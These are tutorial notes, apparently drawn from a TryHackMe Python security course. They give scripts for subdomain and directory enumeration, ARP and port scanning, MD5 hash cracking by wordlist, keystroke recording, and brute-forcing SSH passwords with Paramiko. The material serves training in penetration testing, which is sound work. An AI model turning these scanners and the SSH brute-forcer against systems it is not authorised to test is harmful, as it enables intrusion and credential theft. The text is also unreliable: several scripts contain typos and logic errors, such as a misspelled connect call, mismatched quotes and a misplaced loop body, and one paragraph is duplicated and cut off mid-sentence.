<a href=https://tryhackme.com/room/pythonforcybersecurity>Subdomain Enumeration</a></br>
<em>Finding subdomains used by the target organization is an effective way to increase the attack surface and discover more vulnerabilities.</br>The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument. The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.</br></em></br>
<b>subdomain.py</b>
<pre>
import requests
import sys
sls=open("subd.txt").read()
subd=sls.splitlines()
for x in subd:
    sd=f"http://{x}.{sys.argv[1]}"
    try:
        requests.get(sd)
    except requests.ConnectionError:
        pass
    else:
        print(f"Valid domain: {sd}")
</pre>

<b>subd.txt</b>
<pre>
test
mail
ftp
www
skype
delta1
demo
digital
discover
enterprise
erp
energy
os
proxy
payment
apps
myapps
marketing
sales
hr
finance
sip
error
</pre>

</br><b>RUN</b>
<pre>
<img src="https://imgur.com/2lClGIP.png"/>
</pre>
</br><a href=https://tryhackme.com/room/pythonforcybersecurity>Directory Enumeration</a></br>
<em>As it is often pointed out, reconnaissance is one of the most critial steps to the success of a penetration testing engagement. Once subdomains have been discovered, the next step would be to find directories. </br>The following code will build a simple directory enumeration tool.</em></br>
```
import requests
import sys
a=open("subd3.txt").read()
b=a.splitlines()
for x in b:
    c=f"http://{sys.argv[1]}/{x}.html"
    r=requests.get(c)
    if r.status_code==404:
        pass
    else:
        print(f"Valid directory: {c}")
```
<em><b>subd3.txt</b></em>
```
123456
password
12345678
1234
12345
...+494
index
```

</br><b>RUN</b></br>
<pre><img src=https://i.imgur.com/fNwiqxg.png></img></pre>
</br><a href=https://tryhackme.com/room/pythonforcybersecurity>Network Scanner</a></br>
<em>Python can be used to build a simple ICMP (Internet Control Message Protocol) scanner to identify potential targets on the network. However, ICMP packets can be monitored or blocked as the target organization would not expect a regular user to "ping a server".</br>On the other hand, systems can be configured to not respond to ICMP requests. These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective.</em>

<pre>
from scapy.all import *
interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"
packet = Ether(dst=broadcastMac)/ARP(pdst=ip_range)
ans,unans = srp(packet,timeout=2,iface=interface,inter=0.1)
for send,receive in ans:
    print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
</pre>

</br><a href=https://tryhackme.com/room/pythonforcybersecurity>Port Scanner</a></br>
<em>A simple Port Scanner</em>
</br><pre>
import socket,sys
import pyfiglet
ascii_banner=pyfiglet.figlet_format("Simple Port Scanner")
print(ascii_banner)
ip = 'X.X.X.X'
open_ports=[]
ports=range(1,65535)

def probe_port(ip,port,result=1):
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(0.5)
        r = sock.conect_ex((ip,port))
        if r == 0:
            result = r
        sock.close()
    except Exception as e:
        pass
    return result
    
for port in ports:
    sys.stdout.flush()
    response = probe_port(ip,port)
    if response == 0:
        open_ports.append(port)
        
if open_ports:
    print ("Open Ports are: ")
    print (sorted(open_ports))
else:
    print ("Looks like no ports are open!")
</pre>

</br><em> To better understand the port scanning process,we can break down the code into several sections:</em></br>
<em><b>Importing modules that will help the code run:</b></em></br>
<pre>import sys
import socket</pre></br>
<em><b>Modules could also be imported with a single line using:</em></b></br>
<pre>import socket,sys</pre></br>
<em><b>Specifying the target and also an empty "open_ports" array that will be populated later with the detected open ports:</em></b></br>
<pre>ip = "X.X.X.X"
open_ports=[]</pre></br>
<em><b>Ports that will be probed:</em></b></br>
<pre>ports=range(1,65535)</pre></br>
<em>For this example, we have chosen to scan all TCP ports using the range() function. However, if you are looking for a specific service or want to save time by scanning a few common ports, the code could be changed as follows:</em></br>
<pre>ports = {21,22,23,24,25,53,80,135,443,445}</pre></br>
<em>The list above is relatively small. As we are trying to keep a rather low profile, we have limited the list to ports that will likely be used by systems connected to a corporate network.</em></br>
<em>Getting the IP address of the domain name given as target. The code also works if the user directly provides the IP address.</em></br>
<pre>ip=socket.gethostbyname(host)</pre></br>
<em>Tries to connect to the port:</em></br>
<pre>def probe_port(ip,port,result=1):
    try:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        r = sock.connect_ex((ip,port))
        if r == 0:
            result = r
        sock.close()
    except Exception as e:
        pass
    return result</pre></br>

<em>This code is followed by a for loop that iterates through the specified port list:</em></br>
<pre>for port in ports:
    sys.stdout.flush()
    response = probe.port(ip,port)
    if response == 0:
        open_ports.append(port)</pre></br>
<em><b>File Downloader</b></br>
Wget on Linux systems or Certutil on Windows are useful tools to download files.</br> Python can also be used for the same purpose.</br>The code:</em></br>
<pre>
import requests
url = 'http://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url,allow_redirects=True)
open('THMlogo.png','wb').write(r.content)</pre></br>
<em>This short piece of code can easily be adapted to retrieve any other type of file, as seen below:</em></br>
<pre>import requests
url='https://download.sysinternals.com/files/PSTools.zip'
r=requests.get(url,allow_redirects=True)
open('PSTools.zip','wb').write(r.content)
</pre></br>
<em>A Hash is often used to safeguard passwords and other important data. As a penetration tester, you may need to find the cleartext value for several different hashes. The Hash library in Python allows you to build hash crackers according to your requirements quickly.</em></br>
<em>Hashlib is a powerful module that supports a wide range of algorithms.</em></br>
<pre> >>> import hashlib
>>> hashlib.algorithms_available
{'md5-sha1','sha3_256','sha384','shake_256','blake2b','sha512_224','md4','shake_128','ripemd160','sha3_224','md5','sha3_384','sha512_256','sha224','blke2s','whirlpool','sm3','sha512','sha1','sha256','sha3_512'}</pre></br>
<em>Leaving aside some of the more exotic ones you will see in the list above, hashlib will support most of the commonly used hashing algorithms.</em></br>
<pre>import hashlib
import pyfiglet
ascii_banner=pyfiglet.figlet_format("HASH CRACKER MD5")
print(ascii_banner)

wordlist_location=str(input('Wordlist file location: '))
hash_input =str(input('Hash to be cracked: "))

with open(wordlist_location, 'r') as file: 
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext hash! ' + line.strip())
            exit(0)</pre></br>
            
<em>This script will require two inputs: the location of the wordlist and the hash value.</em></br>
<em>As you probably know, hash values can not be cracked as they do not contain the cleartext value. Unlike encrypted values that can be "reversed" (e.g. decrypted), cleartext values for hashes can only be found starting with a list of potential cleartext values. A simplified process can be seen below;</em></br>
<pre>1. You retrieve the hash value "eccbc87e4b5ce2fe28308fd9f2a7baf3" from a database, which you suspect is the hash for a number between 1 and 5.
2. You create a file with possible cleartext values (numbers from 1 to 5)
3. You generate a list of hashes for values in the cleartext list (Hash values for numbers between 1 and 5)
4. You compare the generated hash with the hash value at hand (Matches hash value of the number 3)</pre></br>
<em>Obviously, a more effective process can be designed, but the main principle will remain identical.</em></br>
<em>Modules allow us to solve relatively difficult problems in a simple way. </br> A good example is the keyboard module, which allows us to interact with the keyboard. If the keyboard module is not available on your system, we can use pip3 to install it. </br> <pre>pip3 install keyboard</pre></br> Using the keyboard module, the following three lines of code would be enough to record and replay keys pressed:</em></br>
<pre>import keyboard
keys=keyboard.record(until="ENTER")
keyboard.play(keys)</pre></br>
<em>"keyboard.record" will record the keys until ENTER is pressed, and "keyboard.play" will replay them. As this script is logging keystrokes, any edit using backspace will also be seen.</em></br></br>
<img src="https://i.imgur.com/LqK3ZRs.png"/>
</br><em>The powerful Python language is supported by a number of modules that easily extend its capabilities. Paramiko is an SSHv2 implementation that will be useful in building SSH clients and servers.</br> The example below shows one way to build an SSH password brute force attack script. As is often the case in programming, there rarely isa single correct answer for these kinds of applications. As a penetration tester, your usage of programming languages will be different for developers. While they may care about best practices and code hygiene, your goal will more often be to</em></br>
</br><em>The powerful Python language is supported by a number of modules that easily extend its capabilities. Paramiko is an SSHv2 implementation that will be useful in building SSH clients and servers.</br>
The example below shows one way to build an SSH password brute force attack script. As is often the case in programming, there rarely is a single correct answer for the case in programming, there rarely is a single correct answer for these kinds of applications. As a penetration tester, your usage of programming languages will be different for developers. While they may care about best practices and code hygiene, your goal will more often be to end with a code that works as you want it to. </em></br>
<em>By now, we should be familiar with the "try" and "except" syntax. This script has one new feature, "def". "Def" allows us to create custom functions, as seen below. The "ssh_connect" function is not native to Python but built using Paramiko and the "paramiko.SSHClient()" function. </em></br>
</br>
```python
import paramiko
import sys
import os

target = str(input("TARGET: "))
port = int(input("PORT: "))
username = str(input("USERNAME: "))
password_file=str(input("PASSWORD FILE: "))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target,port=port,username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code
    
with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
    try:
        response = ssh_connect(password)
        
        if response == 0:
            print(f"Password: {password}")
            exit(0)
        elif response == 1:
            print ("No luck")
    except Exception as e:
        print (e)
    pass
input_file.close()
```
</br><em>Reading the code, you will notice several distinct components:</br>
Imports: We import modules we will use inside the script. As discussed earlier, we will need Paramiko to interact with the SSH server on the target system. "Sys" and "os" will provide us with the basic functionalities needed to read a file from the operating system (our password list in this case). As we are using Paramiko to communicate with the SSH server, we do not need to import "socket".</em></br>
<em>Inputs: This block will request input from the user. An alternative way to do this would be to accept the user input directly from the command line as an argument using "sys.argv[]".
</br>SSH Connection: This section will create the "ssh_connect" function. Succesful authentication will return a code 0, a failed authentication will return a code 1.</em></br>
<em>Password list: We then open the password file supplied earlier by the user and take each line as a password to be tried.</em></br>
<em>Response: The script tries to connect to the SSH server and decides on an output based on the response code. Please not the response code here is the one generated by Paramiko and not an HTTP response code. The script exits once it has found a valid password.</em></br>
<em>As you will see, the scripts run slower than we would expect. To improve speed, you may want to look into threading this process.</em></br>
